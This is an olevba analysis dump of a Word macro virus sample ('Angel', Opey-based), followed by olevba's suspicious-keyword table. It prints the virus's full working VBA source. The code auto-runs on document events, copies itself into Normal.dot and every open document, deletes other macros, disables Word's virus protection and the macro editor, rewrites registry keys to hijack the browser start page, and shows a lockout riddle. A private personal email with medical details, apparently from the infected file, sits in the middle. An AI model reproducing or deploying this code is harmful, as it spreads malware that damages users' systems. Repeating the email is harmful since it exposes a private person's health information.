olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-ceba9e627d59792ba5ec810773f284b849941c4e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-ceba9e627d59792ba5ec810773f284b849941c4e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angel.bas 
in file: Virus.MSWord.Opey-based-ceba9e627d59792ba5ec810773f284b849941c4e - OLE stream: 'Macros/VBA/Angel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()                                      ' coded by Avenging Angel
    Call stealth                                         ' Undetected by Norton Anti-virus 5.0, Dr. Sol. Antivirus
    On Error Resume Next                          '   Tbav, and other shits
    Call clascopy                                       ' Copyaright 1999
    ActiveDocument.Save                           ' Comments or Suggestions mailto: avenging.angel@mailcity.com
End Sub                                                 'Payload: change the Owner's Computer name
Sub AutoExec()                                        '   on friday it will ask a question to be answered
    Call stealth                '                         '    after 9/9/99 printing will print all the pages on a document
    On Error Resume Next                          '         changes the home of the internet explorer to my site
    Call clascopy
    If WeekDay(Date) = 6 Then
    Call payload2
    End If
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call clascopy
    Application.UserName = "Another infected of Angel Virus"
    Application.UserAddress = "Hacker From Batangas"
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call clascopy
    If Date < #9/9/99# Then
        Dialogs(wdDialogFilePrint).Show
    Else
        ActiveDocument.PrintOut
    End If
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call clascopy
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call clascopy
End Sub
Sub AutoExit()
    On Error Resume Next
    Call clascopy
    Application.Quit
End Sub
Sub FileSave()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" _
    And ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" And _
    ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    Call payload
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call clascopy
End Sub

Sub clascopy()
   On Error Resume Next
   Call stealth
    infected = False
        For A_A = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            modname = NormalTemplate.VBProject.VBComponents(A_A).Name
                If modname = "Angel" Then infected = True
                If (modname <> "Angel") And (modname <> "ThisDocument") Then
                    Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                End If
        Next A_A
        For Each documentopen In Documents
            Docinfected = False
            With documentopen
                For Angelclaw = documentopen.VBProject.VBComponents.Count To 1 Step -1
                modname = documentopen.VBProject.VBComponents(Angelclaw).Name
                    If modname = "Angel" Then Docinfected = True
                    If (modname <> "Angel") And (modname <> "ThisDocument") And (modname <> "Reference to Normal") Then
                        Application.OrganizerDelete Source:=documentopen.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                    End If
                Next Angelclaw
                If Docinfected = False Then
                     e = NormalTemplate.VBProject.VBComponents(2).CodeModule.CountOfLines
                    vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    documentopen.VBProject.VBComponents.Add(1).Name = "Angel"
                    documentopen.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                End If
            End With
        Next documentopen
            If infected = False Then
                e = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
                    vircode = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    NormalTemplate.VBProject.VBComponents.Add(1).Name = "Angel"
                    NormalTemplate.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                    NormalTemplate.Save
            End If

End Sub
Sub stealth()
   On Error Resume Next
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    CommandBars("tools").Reset
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    ActiveDocument.ReadOnlyRecommended = False
    Application.UserName = "Another infected of Angel Virus"
    Application.UserAddress = "Hacker From Batangas"
    Dialogs(wdDialogFileSummaryInfo).Author = "Another infected of Angel Virus"
    Dialogs(wdDialogFileSummaryInfo).Title = "Angel"
    Dialogs(wdDialogFileSummaryInfo).Execute
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main", _
    "Start Page") = "www.escalix.com/freepage/angel"
     System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\WINDOWS\CURRENTVERSION", _
    "RegisteredOwner") = "Avenging Angel :)"
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = _
    "Infected with Angel Virus"

End Sub

Sub payload()
aname = System.PrivateProfileString("", _
    "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName")

If WeekDay(Date) = 4 Then MsgBox "Angel (ein-dzel)- a divine messenger of GOD" & Chr(13) & aname & " Sucks", 0, "from a Hacker from Batangas 'Too Many Secrets'"
End Sub
Sub payload2()
a = ""
try = 5
If Date > #8/7/99# Then
    Do While a = "" Or UCase(a) <> "DRAWBRIDGE"
        try = try - 1
        a = InputBox("What is close when open and open when close?" & Chr(13) & Chr(13) & "If you know the answer input it or else you cannot use your computer", "Angel Virus")
        If UCase(a) = "DRAWBRIDGE" Then
            MsgBox "nICE I.Q., YOU MAY NOW CONTINUE", 0, "^_^"
            Exit Do
        Else
            If try >= 0 Then
                MsgBox ("You have " & try & "  Tries"), 0, "^_^ Angel Virus"
                If try = 0 Then
                Application.Quit
                End If
            End If
        End If
Loop
End If
End










To: esaquino@yahoo.com
CC:
From: aadrineda@yahoo.com  | Block address
Subject: loving you always
Date: Thu, 6 Jul 2000 16:45:09 -0700
        Add Addresses
 


daddy, i forgot to tell you nga pala yung vitamin e diyan sa
kwarto natin paki-padala mo na lang kay ate myrna. at saka dy,
paki-tawagan mo nga si ate blessie kung anong dapat kong gawin,
tungkol kamo doon sa urinalysis test ko na hindi ko na naipabasa
sa kanya bago ako umalis, pero kamo pinabasa ko sa doctor sa
emergency diyan sa medical city, naka-lagay kamo doon na positive
ako na may sugar sa urine, sabihin mo plus 3 yung nandoon. pls.
dy pakitawagan mona lang para alam ko kung anong gagawin ko.
kung kailangan ko nang check-up, hwag mo na lang  sabihin sa
mga nanay at tatay na pinapatawag kita sa doctor ko, mag-aalala
na naman sila, kaya pag tumawag ka hwag mo na lang iparinig sa
kanila , don 't you worry i'm okey naman, alam ko hindi ako pababayaan
ni "MAMA MARY", that 's why she allowed me to be here on a purpose
of course if not wala sana ako dito ngayon di ba. i know she's
here with me always and she won't leave me no matter what.anyway,
let's change the topic, dy, next time ayokong binibiro mo ko
tungkol sa kung meron ba akong nakita ditong iba, i hate it,
it 's not funny, puwera na lang kung ina-apply mo sa sarili mo
yang sinasabi mo. i know that there'll always be tough times
and in somepoint one or both of us wanted to get out, but for
me no matter what problems may exist i'll stick to this family
we had because i know in my heart you're the only one for me,oh
kaya mo ba yon. take care always&always remember that
iloveyouverymuch.pray
for us always ok. bye-bye for now.love&prayers mommy...









































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |documentopen        |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

